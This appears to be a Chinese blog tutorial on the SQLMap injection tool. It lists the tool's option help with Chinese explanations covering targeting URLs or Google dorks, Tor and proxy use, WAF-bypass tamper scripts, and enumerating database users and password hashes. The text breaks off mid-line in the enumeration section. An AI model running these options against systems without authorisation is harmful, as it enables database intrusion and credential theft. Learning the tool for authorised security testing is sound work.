+<h1 id="5-SQLMap简单介绍"><a href="#5-SQLMap简单介绍" class="headerlink" title="5 SQLMap简单介绍"></a>5 SQLMap简单介绍</h1><ul>
+<li>SQLMap简单介绍<ul>
+<li>SQLMap官网下载：<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org/</a>。</li>
+<li>自动检测各类型的SQL注入漏洞，包括基于错误、时间、联合查询的注入等。</li>
+<li>并且可以从数据库中提取数据，执行系统命令，甚至控制整个数据库服务器。</li>
+<li>常见注入模式<ul>
+<li>布尔盲注：根据返回页面判断条件真假的注入。</li>
+<li>时间盲注：用条件语句查看时间延迟语句是否执行来判断。</li>
+<li>报错注入：页面返回错误信息或把注入结果返回在页面中。</li>
+<li>堆查询注入：同时执行多条语句的执行时注入。</li>
+<li>内联查询注入：在SQL语句里面执行SQL语句。</li>
+<li>联合查询注入：使用UNION操作符的情况下注入。</li>
+</ul>
+</li>
+<li>目录说明<ul>
+<li>lib：核心目录。</li>
+<li>data<ul>
+<li>udf：存放攻击载荷。</li>
+<li>txt：包含了表名字典、列名字典、UA字典等。</li>
+<li>shell：包含了注入成功后的shell远程命令执行。</li>
+<li>xml：存放多种数据库注入检测的payload等信息。</li>
+<li>procs：包含mssql、mysql、oracle、postgresql等触发程序。</li>
+</ul>
+</li>
+<li>doc：具体使用说明、作者信息等。</li>
+<li>extra：额外功能，如发出声响、允许cmd、安全执行等。</li>
+<li>plugins：包含目前支持的数据库信息和数据库通用事项。</li>
+<li>tamper：包含waf绕过脚本(waf，即Web应用防护系统)。</li>
+<li>thirdparty：包含第三方插件，如优化、保持连接、颜色。</li>
+</ul>
+</li>
+<li>PATH环境变量配置：SQLMap路径，目录下再创建一个<code>sqlmap.bat</code>文件。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">@<span class="hljs-built_in">echo</span> off<br>python <span class="hljs-string">&quot;%~dp0sqlmap.py&quot;</span> %*<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="6-SQLMap参数详解"><a href="#6-SQLMap参数详解" class="headerlink" title="6 SQLMap参数详解"></a>6 SQLMap参数详解</h1><ul>
+<li>SQLMap参数详解<ul>
+<li>VERBOSE，话痨模式，使用-v参数，接收一个0-6的数字，数字越大信息越详细。</li>
+<li>0：只显示Python的回源[TRACEBACKS]、错误[ERROR]和关键信息[CRITICAL]。</li>
+<li>1：同时显示普通信息[INFO]和警告信息[WARNING]。</li>
+<li>2：同时显示调试信息[DEBUG]。</li>
+<li>3：同时显示注入的有效载荷[PAYLOADS]，通常用3。</li>
+<li>4：同时显示HTTP的请求。</li>
+<li>5：同时显示HTTP响应头。</li>
+<li>6：同时显示HTTP响应体。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Options:<br>  <span class="hljs-literal">-h</span>, <span class="hljs-literal">--help</span>            Show basic help message and <span class="hljs-keyword">exit</span><br>  <span class="hljs-literal">-hh</span>                   Show advanced help message and <span class="hljs-keyword">exit</span><br>  <span class="hljs-literal">--version</span>             Show program<span class="hljs-string">&#x27;s version number and exit</span><br><span class="hljs-string">  -v VERBOSE            Verbosity level: 0-6 (default 1)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># -h、-help：显示基本帮助信息</span><br><span class="hljs-string">sqlmap -h</span><br><span class="hljs-string">sqlmap -help</span><br><span class="hljs-string"></span><br><span class="hljs-string"># -hh：显示高级帮助信息</span><br><span class="hljs-string">sqlmap -hh</span><br><span class="hljs-string"></span><br><span class="hljs-string"># --version：显示SQLMap版本信息</span><br><span class="hljs-string">sqlmap --version</span><br><span class="hljs-string"></span><br><span class="hljs-string"># -v VERBOSE：指定输出内容的级别，默认1级，0-6级可选</span><br><span class="hljs-string"># ?id=1：指URL中的查询参数，用于向服务器传递特定信息</span><br><span class="hljs-string">sqlmap -v 0 -u &quot;目标URL&quot;</span><br><span class="hljs-string">sqlmap -v 1 -u &quot;目标URL&quot;</span><br><span class="hljs-string">sqlmap -v 5 -u &quot;目标URL&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-1-目标模块"><a href="#6-1-目标模块" class="headerlink" title="6-1 目标模块"></a>6-1 目标模块</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Target:<br>  At least one of these options has to be provided to define the target(s)<br><br>  <span class="hljs-literal">-u</span> URL, <span class="hljs-literal">--url</span>=URL   Target URL (e.g. <span class="hljs-string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>)<br>  <span class="hljs-literal">-d</span> DIRECT           Connection string <span class="hljs-keyword">for</span> direct database connection<br>  <span class="hljs-literal">-l</span> LOGFILE          Parse target(s) from Burp or WebScarab proxy log file<br>  <span class="hljs-literal">-m</span> BULKFILE         Scan multiple targets given <span class="hljs-keyword">in</span> a textual file<br>  <span class="hljs-literal">-r</span> REQUESTFILE      Load HTTP request from a file<br>  <span class="hljs-literal">-g</span> GOOGLEDORK       <span class="hljs-keyword">Process</span> Google dork results as target URLs<br>  <span class="hljs-literal">-c</span> CONFIGFILE       Load options from a configuration INI file<br><br><span class="hljs-comment"># -u URL：指定URL，直接对单个网站进行注入检测</span><br><span class="hljs-comment"># -d DIRECT：直连数据库，DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</span><br><span class="hljs-comment"># 如果报错：&#x27;ModuleNotFoundError: No module named &#x27;MySQLdb&#x27;&#x27;</span><br><span class="hljs-comment"># 说明Python的MySQLdb模块未安装，命令安装模块后重新连接：pip install PyMySQL</span><br><br><span class="hljs-comment"># -l LOGFILE：从代理日志中解析可能攻击的目标，逐个尝试注入</span><br><span class="hljs-comment"># -m BULKFILE：从文本中解析可能攻击的目标，逐一扫描URL</span><br><span class="hljs-comment"># -r REQUESTFILE：以文件中HTTP请求为攻击目标进行测试</span><br><span class="hljs-comment"># -g GOOGLEDORK：将Google到的前一百条结果作为目标进行检测</span><br><span class="hljs-comment"># -c CONFIGFILE：从配置INI文件获取目标</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-2-请求模块"><a href="#6-2-请求模块" class="headerlink" title="6-2 请求模块"></a>6-2 请求模块</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Request:<br>  These options can be used to specify how to connect to the target URL<br><br>  <span class="hljs-literal">-A</span> AGENT, <span class="hljs-literal">--user</span>..  HTTP User<span class="hljs-literal">-Agent</span> header value<br>  <span class="hljs-literal">-H</span> HEADER, <span class="hljs-literal">--hea</span>..  Extra header (e.g. <span class="hljs-string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)<br>  <span class="hljs-literal">--method</span>=METHOD     Force usage of given HTTP method (e.g. PUT)<br>  <span class="hljs-literal">--data</span>=<span class="hljs-keyword">DATA</span>         <span class="hljs-keyword">Data</span> string to be sent through POST (e.g. <span class="hljs-string">&quot;id=1&quot;</span>)<br>  <span class="hljs-literal">--param-del</span>=PARA..  Character used <span class="hljs-keyword">for</span> splitting <span class="hljs-keyword">parameter</span> values (e.g. &amp;)<br>  <span class="hljs-literal">--cookie</span>=COOKIE     HTTP Cookie header value (e.g. <span class="hljs-string">&quot;PHPSESSID=a8d127e..&quot;</span>)<br>  <span class="hljs-literal">--cookie-del</span>=COO..  Character used <span class="hljs-keyword">for</span> splitting cookie values (e.g. ;)<br>  <span class="hljs-literal">--live-cookies</span>=L..  Live cookies file used <span class="hljs-keyword">for</span> loading up<span class="hljs-literal">-to-date</span> values<br>  <span class="hljs-literal">--load-cookies</span>=L..  File containing cookies <span class="hljs-keyword">in</span> Netscape/<span class="hljs-built_in">wget</span> format<br>  <span class="hljs-literal">--drop-set-cookie</span>   Ignore <span class="hljs-built_in">Set-Cookie</span> header from response<br>  <span class="hljs-literal">--http2</span>             Use HTTP version <span class="hljs-number">2</span> (experimental)<br>  <span class="hljs-literal">--mobile</span>            Imitate smartphone through HTTP User<span class="hljs-literal">-Agent</span> header<br>  <span class="hljs-literal">--random-agent</span>      Use randomly selected HTTP User<span class="hljs-literal">-Agent</span> header value<br>  <span class="hljs-literal">--host</span>=HOST         HTTP Host header value<br>  <span class="hljs-literal">--referer</span>=REFERER   HTTP Referer header value<br>  <span class="hljs-literal">--headers</span>=HEADERS   Extra headers (e.g. <span class="hljs-string">&quot;Accept-Language: fr\nETag: 123&quot;</span>)<br>  <span class="hljs-literal">--auth-type</span>=AUTH..  HTTP authentication <span class="hljs-built_in">type</span> (Basic, Digest, Bearer, ...)<br>  <span class="hljs-literal">--auth-cred</span>=AUTH..  HTTP authentication credentials (name:password)<br>  <span class="hljs-literal">--auth-file</span>=AUTH..  HTTP authentication PEM cert/private key file<br>  <span class="hljs-literal">--abort-code</span>=ABO..  Abort on (problematic) HTTP error code(s) (e.g. <span class="hljs-number">401</span>)<br>  <span class="hljs-literal">--ignore-code</span>=IG..  Ignore (problematic) HTTP error code(s) (e.g. <span class="hljs-number">401</span>)<br>  <span class="hljs-literal">--ignore-proxy</span>      Ignore system default proxy settings<br>  <span class="hljs-literal">--ignore-redirects</span>  Ignore redirection attempts<br>  <span class="hljs-literal">--ignore-timeouts</span>   Ignore connection timeouts<br>  <span class="hljs-literal">--proxy</span>=PROXY       Use a proxy to connect to the target URL<br>  <span class="hljs-literal">--proxy-cred</span>=PRO..  Proxy authentication credentials (name:password)<br>  <span class="hljs-literal">--proxy-file</span>=PRO..  Load proxy list from a file<br>  <span class="hljs-literal">--proxy-freq</span>=PRO..  Requests between change of proxy from a given list<br>  <span class="hljs-literal">--tor</span>               Use Tor anonymity network<br>  <span class="hljs-literal">--tor-port</span>=TORPORT  <span class="hljs-built_in">Set</span> Tor proxy port other than default<br>  <span class="hljs-literal">--tor-type</span>=TORTYPE  <span class="hljs-built_in">Set</span> Tor proxy <span class="hljs-built_in">type</span> (HTTP, SOCKS4 or SOCKS5 (default))<br>  <span class="hljs-literal">--check-tor</span>         Check to see <span class="hljs-keyword">if</span> Tor is used properly<br>  <span class="hljs-literal">--delay</span>=DELAY       Delay <span class="hljs-keyword">in</span> seconds between each HTTP request<br>  <span class="hljs-literal">--timeout</span>=TIMEOUT   Seconds to wait before timeout connection (default <span class="hljs-number">30</span>)<br>  <span class="hljs-literal">--retries</span>=RETRIES   Retries when the connection timeouts (default <span class="hljs-number">3</span>)<br>  <span class="hljs-literal">--retry-on</span>=RETRYON  Retry request on regexp matching content (e.g. <span class="hljs-string">&quot;drop&quot;</span>)<br>  <span class="hljs-literal">--randomize</span>=RPARAM  Randomly change value <span class="hljs-keyword">for</span> given <span class="hljs-keyword">parameter</span>(s)<br>  <span class="hljs-literal">--safe-url</span>=SAFEURL  URL address to visit frequently during testing<br>  <span class="hljs-literal">--safe-post</span>=SAFE..  POST <span class="hljs-keyword">data</span> to send to a safe URL<br>  <span class="hljs-literal">--safe-req</span>=SAFER..  Load safe HTTP request from a file<br>  <span class="hljs-literal">--safe-freq</span>=SAFE..  Regular requests between visits to a safe URL<br>  <span class="hljs-literal">--skip-urlencode</span>    Skip URL encoding of payload <span class="hljs-keyword">data</span><br>  <span class="hljs-literal">--csrf-token</span>=CSR..  <span class="hljs-keyword">Parameter</span> used to hold anti<span class="hljs-literal">-CSRF</span> token<br>  <span class="hljs-literal">--csrf-url</span>=CSRFURL  URL address to visit <span class="hljs-keyword">for</span> extraction of anti<span class="hljs-literal">-CSRF</span> token<br>  <span class="hljs-literal">--csrf-method</span>=CS..  HTTP method to use during anti<span class="hljs-literal">-CSRF</span> token page visit<br>  <span class="hljs-literal">--csrf-data</span>=CSRF..  POST <span class="hljs-keyword">data</span> to send during anti<span class="hljs-literal">-CSRF</span> token page visit<br>  <span class="hljs-literal">--csrf-retries</span>=C..  Retries <span class="hljs-keyword">for</span> anti<span class="hljs-literal">-CSRF</span> token retrieval (default <span class="hljs-number">0</span>)<br>  <span class="hljs-literal">--force-ssl</span>         Force usage of SSL/HTTPS<br>  <span class="hljs-literal">--chunked</span>           Use HTTP chunked transfer encoded (POST) requests<br>  <span class="hljs-literal">--hpp</span>               Use HTTP <span class="hljs-keyword">parameter</span> pollution method<br>  <span class="hljs-literal">--eval</span>=EVALCODE     Evaluate provided Python code before the request <br>                      (e.g.<span class="hljs-string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)<br><br><span class="hljs-comment"># -A AGENT、--user-agent：自定义user-agent</span><br><span class="hljs-comment"># --method=METHOD：指定HTTP方法，默认情况下会自动检测</span><br><span class="hljs-comment"># --data=DATA：指定HTTP数据，默认情况下用于执行HTTP请求的GET方法</span><br><span class="hljs-comment"># HTTP会使用POST方法将参数当作HTTP DATA提交，同时检测此参有没注入漏洞</span><br><br><span class="hljs-comment"># --param-del=PARAM：指定参数分割符，默认情况下用&amp;作为分隔符</span><br><span class="hljs-comment"># --cookie=COOKIE：指定cookie内容</span><br><span class="hljs-comment"># --cookie-del：指定cookie分隔符</span><br><span class="hljs-comment"># --load-cookies：将cookie保存在Netscape或Wget格式的文件中，再调用</span><br><span class="hljs-comment"># --drop-set-cookie：忽略使用cookie</span><br><span class="hljs-comment"># cookie的字符分隔通常是分号，用于两种情况</span><br><span class="hljs-comment"># 1、Web应用程序需要基于cookie的身份认证，并含有cookie</span><br><span class="hljs-comment"># 2、想要检测并利用cookie注入（level&gt;=2时自动检测cookie注入）</span><br><br><span class="hljs-comment"># --random-agent：使用随机user-agent进行测试</span><br><span class="hljs-comment"># SQLMap在txt目录的user-agents.txt中存储了各种各样的user-agent</span><br><span class="hljs-comment"># 当level&gt;=3时，就会自动检测user-agent注入</span><br><br><span class="hljs-comment"># --host=HOST：指定HTTP HOST，默认情况下从URL中解析，也可以手动设置</span><br><span class="hljs-comment"># 当level&gt;=5时，就会对HTTP HOST进行SQL注入测试</span><br><br><span class="hljs-comment"># --referer=REFERER：指定HTTP Referer，通过伪造指定HTTP Referer报头值</span><br><span class="hljs-comment"># --headers=HEADERS：指定额外字段，添加多个字段用\n分隔</span><br><span class="hljs-comment"># --auth-type：指定认证方式，Basic，Digest，NTLM等</span><br><span class="hljs-comment"># --auth-cred：用于给出身份认证的凭证</span><br><span class="hljs-comment"># --auth-file：HTTP协议私钥认证</span><br><span class="hljs-comment"># --ignore-code：忽略HTTP错误状态码</span><br><span class="hljs-comment"># --ignore-proxy：忽略代理设置</span><br><span class="hljs-comment"># --proxy=PROXY：设置代理，格式为URL:PORT</span><br><span class="hljs-comment"># --proxy-cred：当协议需要认证时，使用参数提供凭证</span><br><span class="hljs-comment"># --proxy-file：指定一个包含代理列表的文件，当前代理无效时自动跳到下个代理</span><br><span class="hljs-comment"># --tor：自动设置使用Tor代理</span><br><span class="hljs-comment"># --tor-port：自定义代理的端口</span><br><span class="hljs-comment"># --tor-type：自定义代理的类型</span><br><span class="hljs-comment"># --check-tor：检查一切数据是否都走匿名代理，检查失败将警告并退出</span><br><span class="hljs-comment"># --delay=DELAY：设定每个HTTP请求之间的延迟，默认情况下不设置</span><br><span class="hljs-comment"># --timeout=TIMEOUT：设置超时时间，默认30s，有效值是一个浮点数</span><br><span class="hljs-comment"># --retries=RETRIES：设置连接超时后的最大重试次数，默认3次</span><br><span class="hljs-comment"># --randomize=RPARAM：随机更改参数，可指定请求参数名称</span><br><span class="hljs-comment"># --safe-url=SAFEURL：隔段时间就访问一下正确的URL</span><br><span class="hljs-comment"># --safe-post：访问正确URL时携带的POST数据</span><br><span class="hljs-comment"># --safe-req：从文件中载入安全HTTP请求</span><br><span class="hljs-comment"># --safe-freq：每次测试请求后都会访问一下安全的URL</span><br><span class="hljs-comment"># --skip-urlencode：关闭参数值的URL编码，默认开启</span><br><span class="hljs-comment"># --csrf-token：用于指定隐藏字段名称</span><br><span class="hljs-comment"># --csrf-url=CSRFURL：用于从任意的URL中回收token值</span><br><span class="hljs-comment"># --force-ssl：强制使用SSL/HTTPS</span><br><span class="hljs-comment"># --eval=EVALCODE：在每次请求前执行特定的Python代码</span><br><span class="hljs-comment"># 根据id值重新计算hash值，并更新GET请求中的hash值</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-3-注入模块"><a href="#6-3-注入模块" class="headerlink" title="6-3 注入模块"></a>6-3 注入模块</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Injection:<br>  These options can be used to specify which parameters to test <span class="hljs-keyword">for</span>,<br>  provide custom injection payloads and optional tampering scripts<br><br>  <span class="hljs-literal">-p</span> TESTPARAMETER    Testable <span class="hljs-keyword">parameter</span>(s)<br>  <span class="hljs-literal">--skip</span>=SKIP         Skip testing <span class="hljs-keyword">for</span> given <span class="hljs-keyword">parameter</span>(s)<br>  <span class="hljs-literal">--skip-static</span>       Skip testing parameters that not appear to be dynamic<br>  <span class="hljs-literal">--param-exclude</span>=..  Regexp to exclude parameters from testing (e.g. <span class="hljs-string">&quot;ses&quot;</span>)<br>  <span class="hljs-literal">--param-filter</span>=P..  <span class="hljs-built_in">Select</span> testable <span class="hljs-keyword">parameter</span>(s) by place (e.g. <span class="hljs-string">&quot;POST&quot;</span>)<br>  <span class="hljs-literal">--dbms</span>=DBMS         Force back<span class="hljs-literal">-end</span> DBMS to provided value<br>  <span class="hljs-literal">--dbms-cred</span>=DBMS..  DBMS authentication credentials (user:password)<br>  <span class="hljs-literal">--os</span>=OS             Force back<span class="hljs-literal">-end</span> DBMS operating system to provided value<br>  <span class="hljs-literal">--invalid-bignum</span>    Use big numbers <span class="hljs-keyword">for</span> invalidating values<br>  <span class="hljs-literal">--invalid-logical</span>   Use logical operations <span class="hljs-keyword">for</span> invalidating values<br>  <span class="hljs-literal">--invalid-string</span>    Use random strings <span class="hljs-keyword">for</span> invalidating values<br>  <span class="hljs-literal">--no-cast</span>           Turn off payload casting mechanism<br>  <span class="hljs-literal">--no-escape</span>         Turn off string escaping mechanism<br>  <span class="hljs-literal">--prefix</span>=PREFIX     Injection payload prefix string<br>  <span class="hljs-literal">--suffix</span>=SUFFIX     Injection payload suffix string<br>  <span class="hljs-literal">--tamper</span>=TAMPER     Use given script(s) <span class="hljs-keyword">for</span> tampering injection <span class="hljs-keyword">data</span><br><br><span class="hljs-comment"># -p TESTPARAMETER：指定测试参数</span><br><span class="hljs-comment"># --skip=SKIP：指定跳过的测试参数</span><br><span class="hljs-comment"># --skip-static：跳过测试静态参数</span><br><span class="hljs-comment"># --param-exclude：使用正则表达式排除测试参数</span><br><span class="hljs-comment"># --dbms=DBMS：指定后端数据库类型，加快SQLMap的执行速度</span><br><span class="hljs-comment"># 默认情况下自动探测web应用后端的数据库类型</span><br><br><span class="hljs-comment"># --os=OS：指定数据库管理系统的操作系统，默认情况下自动检测</span><br><span class="hljs-comment"># --invalid-bignum：强制使用大数生成无效参数</span><br><span class="hljs-comment"># --invalid-logical：强制使用逻辑操作生成无效参数</span><br><span class="hljs-comment"># --invalid-string：强制使用随机字符串生成无效参数</span><br><span class="hljs-comment"># --no-cast：获取数据时将所有数据转换成字符串，并用空格代替null</span><br><span class="hljs-comment"># --no-escape：关闭字符串转义机制</span><br><span class="hljs-comment"># --prefix=PREFIX：指定payload前缀</span><br><span class="hljs-comment"># --suffix=SUFFIX：指定payload后缀</span><br><span class="hljs-comment"># --tamper=TAMPER：使用SQLMap自带或自定义的tamper，来混淆payload</span><br><span class="hljs-comment"># 当需要绕过IPS或Web应用程序防火墙(WAF)时，可以使用该选项</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-4-探测模块"><a href="#6-4-探测模块" class="headerlink" title="6-4 探测模块"></a>6-4 探测模块</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Detection:<br>  These options can be used to customize the detection phase<br><br>  <span class="hljs-literal">--level</span>=LEVEL       Level of tests to perform (<span class="hljs-number">1</span><span class="hljs-literal">-5</span>, default <span class="hljs-number">1</span>)<br>  <span class="hljs-literal">--risk</span>=RISK         Risk of tests to perform (<span class="hljs-number">1</span><span class="hljs-literal">-3</span>, default <span class="hljs-number">1</span>)<br>  <span class="hljs-literal">--string</span>=STRING     String to match when query is evaluated to True<br>  <span class="hljs-literal">--not-string</span>=NOT..  String to match when query is evaluated to False<br>  <span class="hljs-literal">--regexp</span>=REGEXP     Regexp to match when query is evaluated to True<br>  <span class="hljs-literal">--code</span>=CODE         HTTP code to match when query is evaluated to True<br>  <span class="hljs-literal">--smart</span>             Perform thorough tests only <span class="hljs-keyword">if</span> positive heuristic(s)<br>  <span class="hljs-literal">--text-only</span>         <span class="hljs-built_in">Compare</span> pages based only on the textual content<br>  <span class="hljs-literal">--titles</span>            <span class="hljs-built_in">Compare</span> pages based only on their titles<br><br><span class="hljs-comment"># --level=LEVEL：检测级别，探测等级1-5，默认值1</span><br><span class="hljs-comment"># 默认情况下只支持GET/POST参数的注入测试</span><br><br><span class="hljs-comment"># level&gt;=2时检查cookie中的参数</span><br><span class="hljs-comment"># level&gt;=3时检查user-agent和referer</span><br><span class="hljs-comment"># level=5时检查host，包含的payload最多</span><br><span class="hljs-comment"># 在data\xml\payloads目录的文件内可见各个level发送的payload</span><br><br><span class="hljs-comment"># --risk=RISK：风险级别，风险等级1-3，最大值3</span><br><span class="hljs-comment"># 1：测试大部分的测试语句(默认)</span><br><span class="hljs-comment"># 2：增加基于时间盲注的检测</span><br><span class="hljs-comment"># 3：增加基于OR盲注的检测</span><br><span class="hljs-comment"># 例如：在UPDATE语句中注入一个OR测试语句</span><br><span class="hljs-comment"># 可能导致更新整个表，这样就会造成很大风险</span><br><br><span class="hljs-comment"># --string=STRING：指定一个字符串，该字符串存在于Ture页面中</span><br><span class="hljs-comment"># --not-string：指定一个字符串，该字符串只存在于False页面中</span><br><span class="hljs-comment"># --regexp=REGEXP：指定一个正则表达式而非字符串</span><br><span class="hljs-comment"># --code=CODE：指定一个状态码</span><br><span class="hljs-comment"># --titles：指定一个标题</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-5-枚举模块"><a href="#6-5-枚举模块" class="headerlink" title="6-5 枚举模块"></a>6-5 枚举模块</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Enumeration:<br>  These options can be used to enumerate the back<span class="hljs-literal">-end</span> database management <br>  system information, structure and <span class="hljs-keyword">data</span> contained <span class="hljs-keyword">in</span> the tables<br><br>  <span class="hljs-literal">-a</span>, <span class="hljs-literal">--all</span>           Retrieve everything<br>  <span class="hljs-literal">-b</span>, <span class="hljs-literal">--banner</span>        Retrieve DBMS banner<br>  <span class="hljs-literal">--current-user</span>      Retrieve DBMS current user<br>  <span class="hljs-literal">--current-db</span>        Retrieve DBMS current database<br>  <span class="hljs-literal">--hostname</span>          Retrieve DBMS server hostname<br>  <span class="hljs-literal">--is-dba</span>            Detect <span class="hljs-keyword">if</span> the DBMS current user is DBA<br>  <span class="hljs-literal">--users</span>             Enumerate DBMS users<br>  <span class="hljs-literal">--passwords</span>         Enumerate DBMS users password hashes<br>  <span class="hljs-literal">--privileges</span>        Enumerate DBMS users privileges<br>  <span class="hljs-literal">--roles</span>             Enumerate DBMS users roles<br>  <span class="hljs-literal">--dbs</span>               Enumerate DBMS databases<br>  <span class="hljs-literal">--tables</span>            Enumerate DBMS database tables<br>  <span 